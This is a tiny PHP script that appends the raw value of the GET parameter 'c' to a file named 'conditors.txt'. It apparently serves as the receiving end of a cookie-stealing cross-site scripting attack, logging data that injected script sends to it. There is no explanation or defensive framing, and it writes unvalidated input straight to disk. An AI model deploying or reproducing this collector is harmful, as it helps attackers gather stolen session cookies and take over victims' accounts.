<?php
    $file = fopen("conditors.txt", "a");
    fwrite($file, $_GET["c"]);
    fclose($file);
?>